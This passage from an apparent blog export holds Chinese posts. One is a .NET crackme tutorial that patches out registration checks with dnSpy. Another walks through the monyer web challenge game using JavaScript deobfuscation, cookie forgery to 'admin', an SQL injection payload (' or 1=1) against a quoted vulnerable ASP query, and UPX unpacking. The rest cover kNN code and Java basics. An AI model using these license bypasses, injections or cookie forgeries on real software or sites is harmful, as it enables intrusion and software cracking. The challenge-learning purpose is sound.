%}\n\n将需要脱壳的程序拖进`de4dot.exe`程序，在程序本目录下就会生成一个已脱壳程序。拿去DIE查壳，壳已经去掉了。\n\n{% asset_img 3.2.png 脱壳 %}\n\n将两个程序载入dnSpy查看区别。发现加壳程序会有一些乱码的类。\n\n{% asset_img 3.3.png dnSpy分析 %}\n\n运行脱壳程序熟悉一下流程。搜索关键字符串定位函数。\n\n{% asset_img 3.4.png dnSpy分析 %}\n\n第一种方法：通过爆破，无论输入什么都显示已注册。\n\n{% asset_img 3.5.png dnSpy分析 %}\n\n{% asset_img 3.6.png 已注册 %}\n\n第二种方法：获取注册码。\n\n在if语句处下断，运行，发现value值出不来，up主说是编译器优化问题，暂时还没有好的解决办法。\n\n{% asset_img 3.7.png dnSpy分析 %}\n\n# 4. 修改程序内容\n\n有壳，直接拿去de4dot脱壳。脱壳失败，让我们使用最新版的de4dot。\n\n{% asset_img 4.1.png 脱壳失败 %}\n\n去爱盘下载了个最新版的，不错，好用！\n\n{% asset_img 4.2.png 脱壳成功 %}\n\n这次的目标是要修改程序的内容，那就修改一下标题，修改成我不过分吧嘿嘿。\n\n{% asset_img 4.3.png 运行程序 %}\n\n载入dnSpy，搜索需要修改的字符串。\n\n{% asset_img 4.4.png dnSpy分析 %}\n\n一样，右键 -> 修改方法。编译，保存。锵锵~修改成功！\n\n{% asset_img 4.5.png 修改标题 %}\n\n# 5. 调用堆栈\n\n程序无壳，运行一下程序，程序3秒后自动退出，退出会有一个提示。\n\n{% asset_img 5.1.png 运行程序 %}\n\n这像不像退出时出现的NAG窗口。可以查看 [调试器使用教程实验六中的去除软件关闭后弹出的广告](https://v5le0n9.github.io/posts/33a085c7.html#13-%E5%AE%9E%E9%AA%8C%E5%85%AD-VisualSite-Designer) 。\n\n这个程序一样，运行到弹窗后按暂停键。调试 -> 窗口 -> 调用堆栈，查看堆栈窗口，找到在程序领空的。\n\n{% asset_img 5.2.png dnSpy分析 %}\n\n倒着来一个个看，第一个`Form1_FormClosing`是弹窗内容。不是什么重要函数。\n\n{% asset_img 5.3.png dnSpy分析 %}\n\n第二个是有关时间的函数。很有可能是这个，因为3s后自动结束就是用了时间计数器。\n\n{% asset_img 5.4.png dnSpy分析 %}\n\n第三个是main函数，里面没有计数的内容。\n\n{% asset_img 5.5.png dnSpy分析 %}\n\n将第二个方法的退出函数注释，编译保存。重新运行程序，发现3s后没有退出程序，但关闭还是有NAG窗口。用同样方法注释掉即可。\n\n也可以在main函数中一直进去进到`InitializeComponent`方法，注释掉使用一二函数的代码，就可实现既无倒数也无NAG窗口。\n\n{% asset_img 5.6.png dnSpy分析 %}\n\n# 6. Main函数\n\n在没有任何敏感字符串和NAG窗口的情况下，只能进入main函数一探究竟。\n\n{% asset_img 6.1.png 运行程序 %}\n\nmain函数如何进入？也是用5的方法调用堆栈。一直进入到`InitializeComponent`方法，分析。\n\n{% asset_img 6.2.png dnSpy分析 %}\n\n右键label2 -> 分析，查看分析器，label2被timer1使用到了。\n\n{% asset_img 6.3.png dnSpy分析 %}\n\n注释掉随机函数，修改为自己想要的文本。\n\n{% asset_img 6.4.png dnSpy分析 %}\n\n{% asset_img 6.5.png 修改文本 %}\n\n# 7. 打不开的程序\n\n运行一下，程序打开不了。查壳无壳，载入dnSpy查看函数。发现在main函数调用了程序关闭函数，导致程序一打开直接运行到关闭函数自动关闭自己。\n\n{% asset_img 7.1.png dnSpy分析 %}\n\n那就直接注释掉main函数调用关闭函数那一行。\n\n{% asset_img 7.2.png 打开程序 %}\n\n# 8. 修改程序内容2.0\n\n拿去查壳，无壳，64位.net程序，载入dnSpy。\n\n{% asset_img 8.1.png dnSpy分析 %}\n\n发现它与我们之前调试的程序有点不一样。搜索字符串无果。找到main函数分析一下。\n\n{% asset_img 8.2.png dnSpy分析 %}\n\n查看`.baml`文件，右键发现没有编辑方法功能，但可以使用十六进制编辑器修改内容。\n\n{% asset_img 8.3.png dnSpy分析 %}\n\n右键 -> 打开十六进制编辑器。Ctrl + F 搜索，好像不能输入中文，但可以粘贴中文。确保找到的地方是我们要修改的地方，随意修改可能会出现问题。\n\n建议修改的比原来的字节数要少，因为怕溢出。系统用00填充未修改的字节。\n\n{% asset_img 8.4.png 修改内容 %}\n\n{% asset_img 8.5.png 修改内容 %}\n\n文件 -> 全部保存。\n\n{% asset_img 8.6.png 修改成功 %}\n\n# 9. de4dot反混淆\n\n还没有找到合适的程序，暂时先到这里吧。","categories":["Windows逆向"],"tags":["Reverse"]},{"title":"monyer闯关小游戏","url":"/posts/76c5464c.html","content":"[梦之光芒](http://monyer.com/game/game1) \n\n查看源码，发现有个链接链接到first.php，进入第1关\n\n1-http://monyer.com/game/game1/first.php\n\n<!--more-->\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n发现密码是两个空格，意思就是说我们在id=txt那一栏填入两个空格，就可以跳转到hello.php；或者直接改URL到hello.php\n\n2-http://monyer.com/game/game1/hello.php\n\n```html\n<script type=\"text/javascript\">\n    document.oncontextmenu=function(){return false};\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d / c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\nMath.floor()向下取整，JavaScript的**/**运算符算到小数`5/2=2.5`。\n\n把那一串代码改改随便拿去哪个语言环境跑跑得出结果。\n\n3-http://monyer.com/game/game1/424178.php\n\n```html\n<script type=\"text/javascript\">   \n  eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\nfromCharCode()将Unicode编码转为一个字符，静态 **`String.fromCharCode()`** 方法返回由指定的 UTF-16 代码单元序列创建的字符串。将里面的代码找个在线JavaScript一转，摇身一变代码：\n\n```javascript\nconsole.log(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n---------------------------------------------------\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n\n4-http://monyer.com/game/game1/d4g.php\n\n输入`d4g`时，看到URL转到`d4g.php`又很快回到了第3关的URL，那只能抓包来看看它返回了什么东西。\n\n```html\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n<meta name=\"robots\" content=\"noindex,nofollow\">\n<meta http-equiv=\"refresh\" content=\"0;url=424178.php\">\n<title>梦之光芒/Monyer——Monyer's Game(第4关)</title>\n<script type=\"text/javascript\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n</head>\n<body>\n<div align=\"center\">\n    <p>欢迎您来到第4关</p>\n    <p>请输入密码进入第5关：\n        <input type=\"text\" id=\"txt\" value=\"\">\n        <input type=\"button\" onClick=\"check()\" value=\"提交\">\n    </p>\n</div>\n</body>\n<script type=\"text/javascript\">\n    eval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n</script>\n</html>\n```\n\n可以看到有两段script，分别将两段script解密：\n\n```html\n<script type=\"text/javascript\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n----------------------------------------------------\nconsole.log(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}));\n-----------------------------------------------------\na=\"3bhe\";function check(){if(document.getElementById('txt').value==a){window.location.href=a+\".php\"}else{alert(\"密码错误\")}}\n```\n\n在URL上跟上`3bhe.php`不行，再来看下第二段JS：\n\n```html\n<script type=\"text/javascript\">\n  eval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n</script>\n-----------------------------------------------------\nconsole.log(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n-----------------------------------------------------\na=a.toUpperCase()+1;\n```\n\n toUpperCase() 方法用于把字符串转换为大写。 \n\n```javascript\nvar a=\"3bhe\"\nconsole.log(a.toUpperCase()+1)\n-----------------------------------------------------\n3BHE1\n```\n\nURL跟上`3BHE1.php`成功跳转到第5关\n\n5-http://monyer.com/game/game1/3BHE1.php\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        window.location.href = document.getElementById(\"txt\").value + \".php\";\n    }\n</script>\n```\n\n页面提示说藏在了页面里，就按F12到处找，看到消息头的响应头里这样一句话：`monyer: the password for the next level is asdf`；或者抓包在响应报文里也可以看到。\n\n6-http://monyer.com/game/game1/asdf.php\n\n```html\n<script type=\"text/javascript\">\n  function check(){\n\t  \twindow.location.href=document.getElementById('txt').value + \"7.php\";\n\t}\n</script>\n```\n\n在图片里找线索，主要是考信息搜索，从图片看出有magazine，用引号将从图片知道的内容包起来搜索，容易找到一家seventeen杂志。\n\n7-http://monyer.com/game/game1/seventeen7.php\n\n```html\n<script type=\"text/javascript\">\n  function check(){\n\t  \twindow.location.href=document.getElementById('txt').value + \".php\";\n\t}\n</script>\n```\n\n它给了几个提示，是关于社工的(感觉我什么都不能信了怎么办)\n\n> 提示1：这关需要简单的社会工程学，请联想本关特点进入下一关。\n>\n> 提示2：不要被你的所见、经验及习惯蒙蔽了你的双眼，看不到的正是你想要的。\n>\n> 提示3：与社会工程学相仿的是暴力破解，所以Monyer给你MD5：5e023995fb3f5e840ee684784f8f0799（小于10的数字+字母）\n\n它说联想本关，我就顺其自然地想到`eighteen8`但出现了Not Found，去解密了MD5发现也是`eighteen8`，我只能看看抓包能有什么效果，还是`eighteen8`，看它会不会有啥302跳转啥的，结果一抓发现Not Found是假的！我再回头看发现它的title就写着第8关，我因为看到Not Found就没注意到title。\n\n```html\n<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n<meta name=\"robots\" content=\"noindex,nofollow\">\n<title>第8关</title>\n</head>\n<body>\n    <h1>Not Found</h1>\n    <p>The requested URL /eighteen8.php was not found on this server.</p>\n    <p>Additionally, a 404 Not Found\n        error was encountered while trying to use an ErrorDocument to handle the request.</p>\n    <p style=\"display:none\">\n    第8关\n\n    朋友您好，第8关欢迎您！\n    我对您的聪明才智感到惊讶！\n    相信我，现在世界上85%以上的人都在你之下，\n    所以你可以大步向前，义无反顾地进行你的事业了。\n    因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n\n\n    那么继续我们的约定，我将告诉你第9关的入口：\n\n    10000以内所有质数和.php\n    </p>\n</body>\n</html>\n```\n\n8-http://monyer.com/game/game1/eighteen8.php\n\n```python\n# -*- coding: utf-8 -*-\n#求10000以内的质数和，借大佬的代码一用\ndef zhishu(num=None):\n    if num is None or num == 1 or num < 0:\n        return 0\n\n    i = 2\n    while True:\n        if i == num:\n            return num\n        elif num % i != 0:\n            i += 1\n        elif num % i == 0 and num != i:\n            break\n\n    return 0\n\ndef sum_zhishu():\n    sum = 0\n    for i in range(10001):\n        sum += zhishu(i)\n    return sum\n\nprint(sum_zhishu())\n#5736396\n```\n\n直接在URL上改`5736396.php`\n\n9-http://monyer.com/game/game1/5736396.php\n\n认认真真看了美女许久一无所获，图片下载下来用notepad++打开发现最后有信息。\n\n> 那句广告词叫什么来着？\n> 对，“在这里，在这里，在这里......”\n> 恭喜你！\n> 第十关密码为：MonyerLikeYou_the10level\n> 从现在开始涉及到少许的动态东西，但你都可以按提示线索完成的！\n> 相信自己，没错的！\n\n10-https://www.monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n>  当前用户身份为simpleuser 不是admin，无法显示下一关密码 \n\n抓包，改cookie中的username为admin，GET地址就是第10关的地址。\n\n页面跳转https://www.monyer.com/game/game1/admin.php\n\n>  好聪明哦！下一关密码为：doyouknow \n\n11-https://www.monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>  你的session不是passer，不能查看下一关密码 \n\nsession在哪找不到，我把URL的false改为true就可以通过了。\n\n>  您的session为passer，所以您可以查看下一关密码：smartboy \n\n12-https://www.monyer.com/game/game1/smartboy.php\n\n> JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n\n有大小写、数字，猜测base64解码：\n\n> %4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n\nURL解码：\n\n> JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\nbase64解码：\n\n> %73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\nURL解码：\n\n> sobeautiful.php\n\n```html\n<form action=\"?\" method=\"post\">\n        <input type=\"text\" name=\"pwd\" value=\"\">\n        <input type=\"submit\" value=\"提交\">\n    </form>\n```\n\n在以上源码中改为`action=\"sobeautiful.php\"`，再次点提交，进到13关。\n\n13-https://www.monyer.com/game/game1/sobeautiful.php\n\n>  本页禁止盗链！ \n\n顺便一说，如果直接在URL上改sobeautiful.php就会出现上面提示，进了第13关又没全进，反正就是做不了题。\n\n查看源码：\n\n```visual basic\ndim connect\nResponse.Expires=0 '系统数据库连接\nSet connect=Server.CreateObject(\"ADODB.Connection\")\nconnect.Open \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" & server.MapPath(\"/Database.mdb\") & \";Mode=ReadWrite|Share Deny None;Persist Security Info=False\"\n\nset rss=server.createobject(\"adodb.recordset\")\nsqlstr=\"select password,pwd from [user] where pwd='\"&request(\"pwd\")&\"'\"\nrss.open sqlstr,connect,1,1\nif rss.bof and rss.eof then\n  response.write(\"密码错误\")\nelse\n  response.write(rss(\"password\"))\nend if\nrss.close\nset rss=nothing\nconnect.close\nset connect=nothing\n```\n\n可知我们填入的\"pwd\"放进select语句查询，可以试试SQL注入。\n\n试`' or 1=1`就试出来了密码：whatyouneverknow\n\n14-https://www.monyer.com/game/game1/whatyouneverknow.php\n\n下载下来是一个exe文件，打开要我们输入16位注册码。先把它放进IDA看看，只有一个函数，用ID5反编译不了，有可能是被加壳了。用查壳软件`exeinfope`看看，被加了upx壳。\n\n```\nupx -d crackme.exe //脱壳\n```\n\n脱壳后再放进IDA，好大的文件。。。试一下动态调试用OD，载入文件后右键->中文搜索引擎->智能搜索，在文本字符串中可以看到`ipasscrackme.asp`文件。\n\n```html\n<script type=\"text/javascript\">\n    function check(){\n        window.location.href = document.getElementById(\"txt\").value + \".php\";\n    }\n</script>\n```\n\n由于它后面规定了是以`.php`结尾，所以改为`ipasscrackme.php`\n\n15-http://monyer.com/game/game1/ipasscrackme.php \n\n> 你最终没能把cookies设为admin \n\n最后抓包将cookies设为admin就可以了。\n\n```\nCookie: username=admin; PHPSESSID=967sro4f61krddtkgkihm6jj68\n```\n\n","categories":["综合"],"tags":["CTF","Web"]},{"title":"k-近邻算法","url":"/posts/e955b133.html","content":"\n2022年4月5日：这周又来个新作业，k-近邻算法手算很容易，但用代码实现确实有点困难了。只能在网上找找参考：https://github.com/zlxy9892/ml_code/blob/master/basic_algorithm/knn 看能不能看懂牛牛们写的算法吧。\n\n2022年5月4日：我们的第一次实验报告竟然是k近邻。想偷懒都不行了，这几天基本上看懂了上面链接的knn算法，先把上面连接的knn算法做个解析。\n\n<!--more-->\n\n```python\n# -*- coding: utf-8 -*-\n# knn.py\nimport numpy as np\nimport operator\n\nclass KNN(object):\n\t#取3个近邻点\n    def __init__(self, k=3):\n        self.k = k\n\n    def fit(self, x, y):\n        self.x = x\n        self.y = y\n\n    def _square_distance(self, v1, v2):\n        #np.square()计算数组中每个元素的平方值，np.sum()求和\n        #欧氏距离\n        return np.sum(np.square(v1-v2))\n\n    def _vote(self, ys):\n        #np.unique()去除数组中的重复元素\n        ys_unique = np.unique(ys)\n        vote_dict = {}\n        for y in ys:\n            if y not in vote_dict.keys():\n                vote_dict[y] = 1\n            else:\n                vote_dict[y] += 1\n        #items()返回可遍历的(键, 值)元组数组\n        #key=operator.itemgetter(1)与sorted结合，表明以元组的第1列进行排序\n        sorted_vote_dict = sorted(vote_dict.items(), key=operator.itemgetter(1), reverse=True)\n        return sorted_vote_dict[0][0]\n\n    def predict(self, x):\n        y_pred = []\n        for i in range(len(x)):\n            dist_arr = [self._square_distance(x[i], self.x[j]) for j in range(len(self.x))]\n            #np.argsort()将dist_arr中的元素从小到大排列，提取其对应的index(索引)\n            sorted_index = np.argsort(dist_arr)\n            top_k_index = sorted_index[:self.k]\n            y_pred.append(self._vote(ys=self.y[top_k_index]))\n        return np.array(y_pred)\n\n    def score(self, y_true=None, y_pred=None):\n        if y_true is None and y_pred is None:\n            y_pred = self.predict(self.x)\n            y_true = self.y\n        score = 0.0\n        for i in range(len(y_true)):\n            if y_true[i] == y_pred[i]:\n                score += 1\n        score /= len(y_true)\n        return score\n```\n\n```python\n# -*- coding: utf-8 -*-\n# train.py\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom knn import *\n\n#np.random.seed()用来设置随机数的种子\n# data generation\nnp.random.seed(314)\n\n# 创建第一个数据集\ndata_size_1 = 300\n#np.random.normal()的意思是一个正态分布,loc=正态分布的均值，scale=正态分布的标准差,size=输入数据的shape\n#第一个数据集以(5,4)为圆心的正态分布\nx1_1 = np.random.normal(loc=5.0, scale=1.0, size=data_size_1)#这里的size表示(300,)表示300行\nx2_1 = np.random.normal(loc=4.0, scale=1.0, size=data_size_1)\ny_1 = [0 for _ in range(data_size_1)]#y1一个类别，y2一个类别\n\n# 创建第二个数据集\ndata_size_2 = 400\n#第二个数据集以(10,8)为圆心的正态分布\nx1_2 = np.random.normal(loc=10.0, scale=2.0, size=data_size_2)#这里的size表示(400,)表示400行\nx2_2 = np.random.normal(loc=8.0, scale=2.0, size=data_size_2)\ny_2 = [1 for _ in range(data_size_2)]\n\n#np.concatenate()对array进行拼接\nx1 = np.concatenate((x1_1, x1_2), axis=0)#x1拼接后有700行，即x的坐标有700个\nx2 = np.concatenate((x2_1, x2_2), axis=0)#坐标轴的y的坐标有700个\n#x1.reshape(-1,1)表示不知道几行，改成1列，这里意思是最后一维度是1\n#np.hstack()将参数元组的元素数组按水平方向进行叠加，叠加后相当于一个列表作为一个坐标点\nx = np.hstack((x1.reshape(-1,1), x2.reshape(-1,1)))\ny = np.concatenate((y_1, y_2), axis=0)#y1y2进行拼接后有700个数据\n\ndata_size_all = data_size_1+data_size_2\nshuffled_index = np.random.permutation(data_size_all)#对0到700的数随机排列序列，返回一个列表\nx = x[shuffled_index]\ny = y[shuffled_index]\n\n#70%作为训练集，30%作为测试集\nsplit_index = int(data_size_all*0.7)\nx_train = x[:split_index]\ny_train = y[:split_index]\nx_test = x[split_index:]\ny_test = y[split_index:]\n\n# visualize data\n#x_train[:,0]取训练集中所有集合的第0个数据，c表示颜色，也就是y集合中不同的数值表示不同类别\nplt.scatter(x_train[:,0], x_train[:,1], c=y_train, marker='.')\nplt.show()\nplt.scatter(x_test[:,0], x_test[:,1], c=y_test, marker='.')\nplt.show()\n\n# data preprocessing\n#数据预处理，这里不懂\nx_train = (x_train - np.min(x_train, axis=0)) / (np.max(x_train, axis=0) - np.min(x_train, axis=0))\nx_test = (x_test - np.min(x_test, axis=0)) / (np.max(x_test, axis=0) - np.min(x_test, axis=0))\n\n# knn classifier\nclf = KNN(k=3)\nclf.fit(x_train, y_train)\n\nprint('train accuracy: {:.3}'.format(clf.score()))\n\ny_test_pred = clf.predict(x_test)\nprint('test accuracy: {:.3}'.format(clf.score(y_test, y_test_pred)))\n```\n\n其实看懂了觉得很容易是不是，作者在knn.py中用了欧氏距离，k值为3，算测试点到全部训练点的距离找前k个最近的训练点进行投票，还加上了一个判断准确率的函数。在train.py中创建随机样本集，将样本集分为训练集和测试集，并且可视化样本集，利用knn.py判断测试集被正确分类的准确率。\n\n为什么说它容易呢？因为作者没有利用到一种更高效率的搜索最近邻点的方法——KD树。在面对海量数据时，计算测试点到全部训练点的距离会花费很长时间，而且也根本没有必要计算测试点到全部训练点的距离，这一点都不“机器学习”。而且关于K值的选取，是很有讲究的。具体看[机器学习 3.2.3 K值的选择](https://v5le0n9.github.io/posts/498ab7d9.html#3-2-3-K值的选择)\n\n当然啦以我目前的水平还不足以解决这些问题，我还是借鉴了作者的代码才能成功写好我的实验报告，所以以上这些问题也是将来我的代码需要完善的地方。\n\n```python\nimport numpy as np\nimport operator\nimport matplotlib.pyplot as plt\n\nclass KNN:\n    def __init__(self,samples,s_labels,k=3):\n        self.samples = samples\n        self.s_labels = s_labels\n        self.k = k\n\n    #曼哈顿距离只计算水平或垂直距离，有维度的限制。而欧氏距离可用于任何空间的距离计算问题，所以数据点可以存在于任何空间，欧氏距离是更可行的选择\n    def distance(self,trains,samples,flag):\n        if flag != 2:\n            return np.sqrt(np.sum(np.square(trains-samples)))#欧氏距离\n        else:\n            return np.sum(np.fabs(trains-samples))#曼哈顿距离\n\n    def vote(self,s_labels):\n        vote_dict = {}\n        for i in s_labels:\n            if i not in vote_dict.keys():\n                vote_dict[i] = 1\n            else:\n                vote_dict[i] += 1\n        #items()返回可遍历的(键, 值)元组数组\n        #key=operator.itemgetter(1)与sorted结合，表明以元组的第1列进行排序\n        sorted_vote_dict = sorted(vote_dict.items(), key=operator.itemgetter(1), reverse=True)\n        return sorted_vote_dict[0][0]\n\n    #直接计算测试点与样本集的距离，选出k个最近\n    def TopKPredict(self,trains,flag=1):\n        t_labels = []\n        for i in range(len(trains)):\n            #每个测试点生成一个距离数组\n            dist_arr = [self.distance(trains[i],self.samples[j],flag) for j in range(len(self.samples))]\n            #np.argsort()将dist_arr中的元素从小到大排列，提取其对应的index(索引)\n            sorted_index = np.argsort(dist_arr)\n            #找距离最近的前k个索引\n            top_k_index = sorted_index[:self.k]\n            #对应测试点索引的类别，将k个类别进行投票\n            t_labels.append(self.vote(self.s_labels[top_k_index]))\n\n        return np.array(t_labels)\n\nclass Picture:\n    def __init__(self,samples,s_labels,trains,t_labels):\n        #.表示训练点，x表示测试点，测试点与哪种颜色相同即为哪种类别\n        s_colors = []\n        t_colors = []\n        for i in s_labels:\n            if i == 1:\n                s_colors.append('b')\n            else:\n                s_colors.append('y')\n        for j in t_labels:\n            if j == 1:\n                t_colors.append('b')\n            else:\n                t_colors.append('y')\n        plt.scatter(samples[:,0], samples[:,1], c=s_colors, marker='.')\n        plt.scatter(trains[:,0], trains[:,1], c=t_colors, marker='x')\n\n    def Show(self):\n        plt.show()\n\n#生成已有标注的样本集与未标注的训练集\ndef createdata():\n    #np.array()用来产生数组\n    \n    #手动赋值\n    #samples = np.array([[2,3],[5,4],[9,6],[4,7],[8,1],[7,2]])  \n    #s_labels = np.array([-1,-1,1,1,-1,-1])\n    #trains = np.array([[3,4.5],[2,4.5],[6,6]])\n    \n    #随机赋值\n    datasize_1 = 50\n    datasize_2 = 60\n    trainsize = 5\n    #创建正例和负例的训练集\n    samples_1 = np.random.normal(loc=10,scale=2,size=(datasize_1,2))\n    s_labels_1 = np.array([1 for i in range(datasize_1)])\n    samples_2 = np.random.normal(loc=5,scale=2,size=(datasize_2,2))\n    s_labels_2 = np.array([-1 for i in range(datasize_2)])    \n    #拼接训练集\n    samples = np.concatenate((samples_1,samples_2),axis=0)\n    s_labels = np.concatenate((s_labels_1,s_labels_2),axis=0)   \n    #创建测试集\n    trains = np.random.randint(2,12,size=[trainsize,2])\n    \n    return samples,s_labels,trains  #返回值如果是两个及以上，是以元组的形式返回\n\nif __name__ == '__main__':\n#输入：训练集\n#输出：k个最近邻点，根据k个最近邻点的类别判断测试点的类别，投票原则\n    samples,s_labels,trains=createdata() #将createdata的三个返回值分别赋给samples、labels、trains\n    knn = KNN(samples,s_labels,k=1)\n    \n    #默认使用欧氏距离，flag=2表示使用曼哈顿距离\n    t_labels = knn.TopKPredict(trains,flag=1)\n    pic = Picture(samples,s_labels,trains,t_labels)\n    pic.Show()\n```\n\n","categories":["算法"],"tags":["Python","机器学习"]},{"title":"Java学习","url":"/posts/8df0ec14.html","content":"\n# 类和对象\n\n类相当于C语言的结构体，但结构体内不能有函数，而类可以。类是一个模型，而对象是类实现的具体事物。\n\n<!--more-->\n\n```java\n/** TestTriangle.java\n算三角形的周长与面积\n*/\nclass Triangle\n{//这是一个类\n    int a,b,c;\n    int zhouchang()\n        return a + b + c;\n    double area()\n    {\n        double p = 1.0 * (a + b + c) / 2;\n        return Math.sqrt(p * (p-a) * (p-b) * (p-c));\n    }\n}\n\nclass TestTriangle\n{\n    public static void main(String[] args)\n    {\n        Triangle t = new Triangle();//由类new出一个对象\n        t.a = 3;\n        t.b = 4;\n        t.c = 5;\n        System.out.printf(\"%d %f\\n\",t.zhouchang(),t.area());\n    }\n}\n/** 在命令行输入\njavac TestTriagle.java\njava TestTriangle\n*/\n```\n\n# 内存分配\n\n```java\n/** TestDemo.java*/\nclass A\n{\n    int i;\n    int j;\n}\n\nclass TestDemo\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        \t\t//new A();相当于(A *)malloc(sizeof(A));\n        \t\t//new A();在堆中动态分配一块区域，被当作A对象\n        \t\t//aa本身是在栈中分配的\n        \t\t//堆中内存地址赋给了aa，aa指向堆中的内存，aa代表了堆中的内存\n        \t\t//aa.i代表aa这个静态指针所指向的动态内存中的A对象的i成员\n        aa.i = 10;\n        aa.j = 20;\n        System.out.printf(\"%d,%d\\n\",aa.i,aa.j);\n    }\n}\n```\n\n# 访问控制符\n\n将类和对象的例子修改一下，在Triangle中添加一个方法访问a,b,c，使得main函数通过这个方法间接访问a,b,c，这个方法相当于一个按钮，一个接口，一个黑匣子，不能让程序员或用户知道里面的具体实现，保证安全。\n\n```java\n/** TestTriangle_2.java\n算三角形的周长与面积\n*/\nclass Triangle\n{\n    private int a,b,c;//私有表示只能在Triangle类里面访问\n    void set(int i, int j, int k)\n    {//方法\n        a = i;\n        b = j;\n        c = k;\n    }\n    int zhouchang()\n        return a + b + c;\n    double area()\n    {\n        double p = 1.0 * (a + b + c) / 2;\n        return Math.sqrt(p * (p-a) * (p-b) * (p-c));\n    }\n}\n\nclass TestTriangle_2\n{\n    public static void main(String[] args)\n    {\n        Triangle t = new Triangle();\n        t.set(3, 4, 5);\n        System.out.printf(\"%d %f\\n\",t.zhouchang(),t.area());\n    }\n}\n/** 在命令行输入\njavac TestTriagle_2.java\njava TestTriangle_2\n*/\n```\n\n类的访问控制符\n\n| 